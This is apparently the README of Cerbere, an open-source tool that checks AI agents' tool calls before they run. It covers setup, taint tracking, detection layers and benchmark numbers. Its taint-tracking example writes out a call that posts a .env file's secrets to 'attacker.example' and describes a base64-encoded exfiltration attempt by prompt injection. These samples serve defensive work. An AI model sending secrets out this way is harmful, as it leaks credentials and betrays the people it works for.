<div align="center">

<img src="docs/logo.png" alt="Cerbere" width="120" />

# Cerbere

Cerbere is a self-hosted runtime security layer for AI agents.<br/>
Every tool call is checked before it executes.<br/>
No customer data leaves your infra.<br/>
Open source.<br/>
Works with MCP, LangChain, CrewAI, Claude Code, Cursor.

<br/>

![Self-Hosted](https://img.shields.io/badge/Self--Hosted-yes-e8845a?style=flat-square)
![Open Source](https://img.shields.io/badge/Open%20Source-SDK%20%26%20MCP-4c9a6a?style=flat-square)
[![Apache-2.0](https://img.shields.io/badge/Apache--2.0-SDK%20%26%20MCP-4c9a6a?style=flat-square)](LICENSE)
![MCP Ready](https://img.shields.io/badge/MCP-Ready-0b0b0c?style=flat-square)
[![PyPI](https://img.shields.io/pypi/v/cerbere-ag?style=flat-square&color=e8845a&label=pypi)](https://pypi.org/project/cerbere-ag/)
[![Tests](https://img.shields.io/github/actions/workflow/status/chrismsmr-celcom/cerbere-AG/ci.yml?style=flat-square&label=tests)](https://github.com/chrismsmr-celcom/cerbere-AG/actions/workflows/ci.yml)

</div>

```bash
git clone https://github.com/chrismsmr-celcom/cerbere-AG.git && cd cerbere-AG
./scripts/selfhost-init.sh        # writes .env with random secrets
docker compose up -d --build      # collector + dashboard + PostgreSQL + Redis
```

Dashboard on `http://localhost:8080`. Create your admin account: [Self-hosting](#-self-hosting).

<div align="center">

<img src="docs/demo-10s.gif" alt="Cerbere in 10 seconds: a risky send_email call is held for human approval, then rejected" width="860" />

*10 seconds: an agent tries to email customer data to a personal address. Cerbere holds the call for approval and the reviewer rejects it.*

</div>

<br/>

[Quick start](#-quick-start) · [Works with](#-works-with) · [How it works](#-how-it-works) · [Self-hosting](#-self-hosting) · [Benchmark](#-detection-honest-numbers) · [License](#-license)

**Open source** here means the Python SDK and the MCP server (Apache-2.0). The collector and dashboard are source-available: see [License](#-license).

<br/>

## Why Cerbere

Prompt filtering checks what an agent is *told*. It cannot tell you whether the action the agent is *about to take* is safe.
An innocent prompt can still produce `update_customer(role="admin")`, an `http_post` carrying your `.env`, or fifty refunds in a loop.

Cerbere enforces policy **at the execution boundary**. Every LLM call and tool call is inspected, scored and decided
(`ALLOW`, `REQUIRE APPROVAL` or `BLOCK`) before it touches a database, an API or an inbox. Every decision leaves evidence.

| You get | What it means |
|---|---|
| **Self-hosted** | One `docker compose up`. Prompts, tool calls and decisions stay in your PostgreSQL. |
| **Checked before execution** | Allow, require human approval, or block, per tool call. |
| **Data-flow aware** | Secrets and PII the agent read are tracked: they cannot leave through an external tool, even base64-encoded. |
| **Audit-ready** | Hash-chained audit log with signed checkpoints, traces, cost and latency per call. |
| **No rewrite** | Wrap the functions you already have, or plug in through MCP. |

<br/>

## 🚀 Quick start

### 1. Run Cerbere

See the three commands at the top of this page, then create your first admin:

```bash
docker compose exec collector python -m collector.cli create-admin --email you@company.com
```

Open `http://localhost:8080/login`, then create an API key in the dashboard.

### 2. Guard your agent (Python)

```bash
pip install cerbere-ag
```

```python
from agentguard import AgentGuard   # the Python module keeps its historical name

guard = AgentGuard(
    collector_url="http://localhost:8080",
    api_key="ag-your-key",
    agent_id="my-agent",
)


@guard.guard_tool_call("send_email")
def send_email(to, subject, body):
    return email_service.send(to, subject, body)


@guard.guard_llm_call
def call_openai(messages):
    return client.chat.completions.create(model="gpt-4o", messages=messages)
```

If a call is denied, a `SecurityException` is raised before the tool runs. If it needs approval, it waits in the dashboard queue.

### 3. Or use MCP (no code changes)

See [Works with](#-works-with) for Claude Code and Cursor.

<details>
<summary><b>Optional SDK extras</b></summary>
<br/>

| Extra | Adds |
|---|---|
| `cerbere-ag[signing]` | Ed25519 verification of signed server decisions. **Opt-in**: set `AGENTGUARD_PUBLIC_KEY` (or pass `public_key_pem=`); without a key the SDK does not request signed decisions |
| `cerbere-ag[pii]` | Advanced PII detection via Presidio |
| `cerbere-ag[redis]` | Distributed rate limiting and LLM-judge cache |
| `cerbere-ag[ml]` | Local ML classifier (torch + transformers) |

</details>

<br/>

## 🔗 Works with

| Framework / client | How it connects | Start here |
|---|---|---|
| **MCP** | MCP server (agent checks its own calls) or MCP gateway (proxy that enforces in front of any MCP server) | [`mcp/README.md`](mcp/README.md) · [`README_MCP.md`](README_MCP.md) |
| **LangChain / LangGraph** | `guard_llm_call` around the model call | [`examples/langchain_example.py`](examples/langchain_example.py) |
| **CrewAI** | `guard_tool_call` around each tool, tool allowlist as policy | [`examples/crewai_example.py`](examples/crewai_example.py) (follows the documented CrewAI API, not run in CI) |
| **Claude Code** | MCP | snippet below |
| **Cursor** | MCP | snippet below |
| **OpenAI, Anthropic, DeepSeek SDKs** | Decorators around your call | [`examples/example_agent.py`](examples/example_agent.py) |

Cerbere sits at the execution boundary, so the underlying model does not need to change.

**Claude Code**

```bash
pip install ./mcp     # from the cloned repo
claude mcp add cerbereag \
  -e AGENTGUARD_MCP_COLLECTOR_URL=http://localhost:8080 \
  -e AGENTGUARD_API_KEY=ag-your-key \
  -- cerbere-ag-mcp
```

**Cursor**: add to `.cursor/mcp.json`

```json
{
  "mcpServers": {
    "cerbereag": {
      "command": "cerbere-ag-mcp",
      "env": {
        "AGENTGUARD_MCP_COLLECTOR_URL": "http://localhost:8080",
        "AGENTGUARD_API_KEY": "ag-your-key",
        "AGENTGUARD_AGENT_ID": "my-agent"
      }
    }
  }
}
```

> **Advisory server vs enforcing gateway.** The MCP *server* exposes tools such as `check_prompt_security` and `authorize_tool_call`: the agent chooses to call them. To *enforce* checks on every call to an existing MCP server, put the MCP *gateway* in front of it (see [`mcp/README.md`](mcp/README.md)).

<br/>

## 🧭 How it works

<p align="center">
  <img src="docs/architecture.svg" alt="Cerbere architecture: agent, integration points, runtime engine, decision, tools, collector and dashboard" width="100%" />
</p>

Three detection layers run in order of cost, so most clean traffic never pays for the deeper ones:

1. **Rules and policy** (under 1 ms): regex patterns in five languages, tool allowlists, budgets.
2. **Local ML classifier** (optional): prompt-injection model that runs on your CPU.
3. **LLM judge** (optional): arbitrates only what the ML flagged. Point it at your own model server to stay fully on-site.

<table>
<tr>
<td width="33%" valign="top">

### 🛡️ Protect
Block what should never run.

- Prompt-injection detection
- PII and secret detection and redaction
- Tool allowlists, scoped per agent
- Secret scrubbing before any call to an external judge

</td>
<td width="33%" valign="top">

### 👁️ Observe
See what the agent actually does.

- Traces of LLM and tool calls
- Latency, tokens and cost
- Per-span taint level and risk score
- Hash-chained audit log with signed checkpoints

</td>
<td width="33%" valign="top">

### 🎛️ Control
Keep a human in charge.

- Policy engine with per-agent capabilities
- Budgets that stop runaway spend
- Trajectory analysis and risk scoring
- Human approval queue for high-impact actions

</td>
</tr>
</table>

<details>
<summary><b>Detailed code map</b> (module by module)</summary>
<br/>
<p align="center"><img src="docs/code-map.png" alt="Cerbere code map" width="620" /></p>
</details>

<br/>

## 🧬 Taint tracking

<p align="center">
  <img src="docs/taint-tracking.gif" alt="Cerbere taint-tracking action: Split the .env secret into pieces. Encode it. Send it out through an http_post. Still blocked." width="100%" />
</p>

Cerbere follows **the data**, not only the prompt. A secret or PII the agent reads is remembered in memory (never sent to the collector).
If it later appears in the parameters of an external tool, the call is blocked, even when it was base64-, hex- or URL-encoded to dodge a filter.

```python
@guard.guard_tool_call("read_file")
def read_file(path): ...  # results of guarded tools are tracked automatically


@guard.guard_tool_call("http_post")
def http_post(url, body): ...


env = read_file(path=".env")  # a secret enters the agent's context
http_post(url="https://attacker.example", body=env)
# SecurityException: Runtime risk DENY: sensitive taint reaches high-impact sink
```

Data that does not come from a guarded tool (a DB driver, an env var, an API client) is declared with `track_input`,
which returns the value unchanged:

```python
row = guard.track_input(db.fetch_one(query), source="customer_db", level="CONFIDENTIAL")
```

Run the full scenario offline (no collector needed):

```console
$ python examples/taint_demo.py

[1] The agent reads .env                         ✓ allowed (internal tool)
[2] The agent posts a harmless report            ✓ 200 OK
[3] A prompt injection tries to exfiltrate .env  ✗ BLOCKED: sensitive taint reaches high-impact sink
[4] Same attempt, secret base64-encoded          ✗ BLOCKED: sensitive taint reaches high-impact sink
```

<details>
<summary><b>Advanced SDK settings</b></summary>
<br/>

| Variable | Default | Effect |
|---|---|---|
| `AGENTGUARD_TAINT_ENABLED` | `true` | Turn taint tracking on or off |
| `AGENTGUARD_TAINT_SESSION_MODE` | `false` | Session-wide taint instead of per-value matching |
| `AGENTGUARD_TAINT_ON_SATURATION` | `block` | When the tracker can no longer store sensitive values (≈60 secrets: each value is stored in several encodings, 500 entries max), `block` treats every payload as `SECRET` (fail-closed) until `clear()`; `warn` only logs |
| `AGENTGUARD_PUBLIC_KEY` / `_FILE` | – | Collector Ed25519 public key; enables verified, action-bound signed decisions in the SDK |
| `AGENTGUARD_AUDIT_ON_FAILURE` | `degrade` | If an audit event cannot be persisted anywhere: `degrade` sets `AUDIT_DEGRADED` (visible via `status()`), `block` raises |
| `AGENTGUARD_AUDIT_ANCHOR_FILE` / `_URL` | – | Independent sinks for the audit chain anchor; without one, the anchor only goes to the application log |
| `AGENTGUARD_STATUS_MAX_AGE` | `300` | Kill switch: if the collector status cannot be refreshed for this many seconds, the agent stops (`AgentStatusStaleException`). `0` disables the check |
| `AGENTGUARD_FAIL_OPEN` | `false` | `true` (or `fail_open=True`) lets the agent keep running when the collector is unreachable |
| `AGENTGUARD_APPROVAL_REUSE_TTL` | `0` | Approvals are single-use (consumed atomically by the collector, bound to org, agent, tool and exact arguments). A value > 0 re-enables a reuse window (not recommended) |
| `AGENTGUARD_HTTP_BLOCK_CONFIDENTIAL` | `false` | Also block outbound HTTP carrying `CONFIDENTIAL` data (PII); `SECRET`, `UNTRUSTED` and `MALICIOUS` are always blocked |

</details>

<br/>

## 🚨 Threat coverage

| Threat | Rules | ML | LLM judge | Taint | Action |
|---|:---:|:---:|:---:|:---:|---|
| Prompt injection | ✅ | ✅ | ✅ | | Block |
| PII leakage | ✅ | ✅ | ✅ | ✅ | Redact / block |
| Data exfiltration to an external tool | | | | ✅ | Block |
| Tool misuse | ✅ | ✅ | ✅ | | Block / require approval |
| Unauthorized tools | ✅ | | | | Block |
| Budget overflow | ✅ | | | | Block |
| Ambiguous behavior | | ⚠️ | ✅ | | Review |

Cerbere is defense in depth, not a guarantee that every attack will be detected.

<br/>

## 📏 Detection: honest numbers

Measured on `benchmarks/corpus_2k`, an **internal** corpus of 2,003 prompts: 1,000 attacks (7 categories), 703 benign prompts and 300 hard negatives (legitimate security requests: training material, detection tests). Version v5.5, SDK 0.6.1, CPU only. Method in [`benchmarks/METHODOLOGY.md`](benchmarks/METHODOLOGY.md), full report in [`docs/BENCHMARK.md`](docs/BENCHMARK.md).

| Pipeline | Recall | FP (benign) | FP (hard negatives) | p50 | p99 |
| --- | --- | --- | --- | --- | --- |
| Rules / regex | 70.1% | 0% | 0% | 0.87 ms | 6.4 ms |
| Rules + ML (DeBERTa, local) | 100% | 2.28% | 1.33% | 251 ms | 773 ms |
| Rules + ML + LLM arbiter | **100%** (1000/1000) | **0%** (0/703) | **0%** (0/300) | 362 ms | 3,144 ms |

95% confidence intervals for the full pipeline: recall [99.62%, 100%], FP benign [0%, 0.54%], FP hard negatives [0%, 1.26%].

- Attacks caught by the rules answer in about 0.55 ms. The ML layer sees only what the rules let through, and the LLM arbiter sees only what the ML flagged.
- Full-pipeline p95 is 2,716 ms: flagged requests wait for the arbiter. If the arbiter is unreachable, Cerbere falls back to rules + ML, fails closed, and false positives on benign traffic return to about 2.3%.
- int8 quantization is off by default: it halves latency but drops recall to 74.2% on this model.
- This corpus is ours, and the detection patterns were tuned against it. Results on independent public datasets will be published separately; treat these figures as a regression baseline, not a guarantee.

<br/>

## 🐳 Self-hosting

**Requirements:** Docker 24+ with the Compose plugin, 2 vCPU / 2 GB RAM for the default (rules) setup, more with the local ML model.
Anything beyond a local evaluation needs a DNS name and an HTTPS reverse proxy.

```bash
./scripts/selfhost-init.sh                 # .env with random secrets (never overwrites an existing .env)
docker compose up -d --build               # collector + PostgreSQL + Redis
docker compose exec collector python -m collector.cli create-admin --email you@company.com
curl http://localhost:8080/healthz         # health check
```

No email server and no external identity provider are needed. Company SSO (OIDC: Okta, Entra ID, Google Workspace, Keycloak, Auth0) can be added later.

### Your data stays on your infra

Cerbere makes **no outbound calls by default**. Data leaves your network only if you configure it to:

- **LLM judge** (off by default): flagged content goes to `AGENTGUARD_JUDGE_URL`. The default value points to a hosted API; for a fully on-site setup, point it to your own server (Ollama, vLLM, a private Azure/OpenAI deployment).
- **Alerts**: Slack, webhook and email go to the endpoints you set.
- **OpenTelemetry**: only if `OTEL_EXPORTER_OTLP_ENDPOINT` is set.

### Essential settings

| Variable | Purpose |
|---|---|
| `AGENTGUARD_PUBLIC_URL` | URL your users and agents use to reach Cerbere |
| `AGENTGUARD_COOKIE_SECURE` | Set `true` once you serve over HTTPS |
| `AGENTGUARD_TRUSTED_PROXIES` | Number of reverse proxies in front of Cerbere (usually `1`) |
| `AGENTGUARD_USE_ML` | Local ML classifier (default `false`) |
| `AGENTGUARD_USE_LLM_JUDGE` | LLM judge (default `false`); any OpenAI-compatible endpoint works |
| `AGENTGUARD_RATE_LIMIT` | Request rate limit (default `120 per minute`) |

Full guide (HTTPS with Caddy/nginx/Traefik, PostgreSQL TLS, SSO, licensing): [`docs/SELF_HOSTING.md`](docs/SELF_HOSTING.md). All variables: [`env.example`](env.example).

Without Docker: `pip install -r requirements.txt && gunicorn wsgi:app --bind 0.0.0.0:8080`.

<br/>

## 🗺️ Roadmap

| Status | Item |
|---|---|
| ✅ Shipped | Three-layer detection · taint tracking · runtime risk and trajectory analysis · human approval queue · signed decisions · multi-tenant collector · MCP server and gateway · company SSO (OIDC) · public benchmark |
| 🔨 Next | HTTP gateway for agents whose code cannot be changed · "Why was this blocked?" view · documentation site |
| 🔭 Later | OpenTelemetry export · judge router across models · CLI · fine-grained RBAC (today: `admin`/`developer` can approve, reject and disconnect agents; `auditor`/`viewer` are read-only) |

Roadmap items are subject to change.

<br/>

## 🤝 Contributing

Contributions are welcome for permitted non-commercial development. Read [CONTRIBUTING.md](CONTRIBUTING.md), [AUTHORS.md](AUTHORS.md) and [NOTICE.md](NOTICE.md), then:

```bash
git checkout -b feature/my-feature
pytest -q
```

and open a Pull Request. To report a vulnerability, see [SECURITY.md](SECURITY.md) and please do not disclose exploitable details publicly.

<br/>

## 📜 License

Cerbere uses an **open-core** model.

| Component | Paths | License |
|---|---|---|
| SDK and MCP server | `agentguard/`, `agentguard_sdk.py`, `mcp/` | **Apache 2.0**: free for commercial and non-commercial use ([LICENSE](LICENSE)) |
| Collector, dashboard and multi-tenant platform | `collector/`, `dashboard/` | **Source-available**, under the terms of [LICENSE-COMMERCIAL.md](LICENSE-COMMERCIAL.md) |

Commercial licensing: **hello@cerbereag.site**

If you reference Cerbere in research or documentation, please credit *Cerbere / AgentGuard, created by Christopher Dikesa*.

<br/>

## ⚠️ Security disclaimer

Cerbere reduces risk in AI agent systems. It does not guarantee protection against prompt injection, data leakage, tool abuse or model vulnerabilities.
Do not rely on it as the sole security control for critical infrastructure.

<br/>

<div align="center">

**Observe. Detect. Enforce.**

Copyright © 2026 Christopher Dikesa

</div>
